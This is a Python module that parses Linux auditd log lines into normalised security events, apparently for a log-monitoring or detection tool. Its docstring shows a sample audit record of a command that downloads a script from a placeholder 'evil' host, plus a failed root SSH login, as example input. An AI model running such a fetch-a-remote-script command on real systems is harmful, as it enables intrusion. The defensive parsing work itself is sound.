"""Linux auditd parser (``/var/log/audit/audit.log`` and forwarded audit records).

The Linux Audit daemon writes one record per line:

    type=SYSCALL msg=audit(1718186400.123:456): arch=c000003e syscall=59 success=yes \
        exit=0 ppid=1200 pid=1234 auid=1000 uid=0 comm="bash" exe="/usr/bin/bash" key="exec"
    type=EXECVE msg=audit(1718186400.123:456): argc=3 a0="curl" a1="-O" a2="http://evil/x.sh"
    type=USER_LOGIN msg=audit(...:789): pid=900 uid=0 acct="root" exe="/usr/sbin/sshd" \
        hostname=? addr=45.83.122.7 terminal=ssh res=failed

Each line is one event. Values may be quoted (and contain spaces), so a tolerant
key=value scanner is used; the ``audit(EPOCH.mmm:seq)`` stamp gives the time and a
correlation id. For ``EXECVE`` the ``a0..aN`` args are reassembled into the executed
command line (so command-line detections fire on Linux too). The full record is
kept in ``raw``.
"""
from __future__ import annotations

import re
from typing import Iterator, Optional

from ..models import NormalizedEvent
from ..util import clean_ip, first, parse_ts, to_int

_HDR = re.compile(
    r"^type=(?P<type>\S+)\s+msg=audit\((?P<epoch>\d+(?:\.\d+)?):(?P<seq>\d+)\):\s*(?P<rest>.*)$")
_KV = re.compile(r"(\w+)=(\"[^\"]*\"|'[^']*'|\S+)")
# audit record types that carry authentication outcomes.
_LOGIN_TYPES = {"USER_LOGIN", "USER_AUTH", "USER_START", "CRED_ACQ", "LOGIN"}
# execve / execveat syscall numbers (x86_64) -> a process launch.
_EXEC_SYSCALLS = {"59", "322"}


def _dq(v: str) -> str:
    return v[1:-1] if len(v) >= 2 and v[0] in "\"'" and v[-1] == v[0] else v


def _command(kv: dict) -> Optional[str]:
    """Reassemble an EXECVE record's a0..aN args into a command line."""
    n = to_int(kv.get("argc"))
    if not n:
        return None
    args = [kv[f"a{i}"] for i in range(n) if f"a{i}" in kv]
    return " ".join(args) if args else None


def _action(rtype: str, kv: dict) -> Optional[str]:
    res = (kv.get("res") or kv.get("result") or "").lower()
    if rtype in _LOGIN_TYPES:
        if res in ("failed", "fail", "no"):
            return "failed-logon" if rtype in ("USER_LOGIN", "LOGIN") else "auth-failure"
        return "logon" if rtype in ("USER_LOGIN", "LOGIN") else "auth-success"
    if rtype == "EXECVE" or (rtype == "SYSCALL" and kv.get("syscall") in _EXEC_SYSCALLS):
        return "process-create"
    return rtype.lower()


def parse(content: str) -> Iterator[NormalizedEvent]:
    for line in content.splitlines():
        m = _HDR.match(line.strip())
        if not m:
            continue
        rtype = m.group("type")
        kv = {k: _dq(v) for k, v in _KV.findall(m.group("rest"))}
        # USER_* records nest acct/addr/res inside an inner msg='op=... ...' blob.
        if "msg" in kv and "=" in kv["msg"]:
            kv.update({k: _dq(v) for k, v in _KV.findall(kv["msg"])})
        res = (kv.get("res") or kv.get("result") or "").lower()
        key = kv.get("key")
        key = key if key and key not in ("(null)", "-") else None
        addr = kv.get("addr") if kv.get("addr") not in (None, "?", "") else kv.get("hostname")

        if rtype == "EXECVE":
            summary = _command(kv)
        elif rtype in _LOGIN_TYPES:
            summary = first(kv.get("op"), kv.get("msg"), kv.get("exe"))
        else:
            summary = first(kv.get("exe"), kv.get("comm"), key)

        yield NormalizedEvent(
            event_time=parse_ts(float(m.group("epoch"))),
            vendor="linux",
            product="auditd",
            log_type=rtype.lower(),
            action=_action(rtype, kv),
            severity="warning" if res in ("failed", "fail", "no") else None,
            src_ip=clean_ip(addr),
            user_name=first(kv.get("acct"), kv.get("auid"), kv.get("uid")),
            host_name=kv.get("node"),
            rule_name=first(key, rtype),
            message=first(summary, m.group("rest")[:500]),
            raw={"type": rtype, "audit_id": m.group("seq"), **kv},
        )
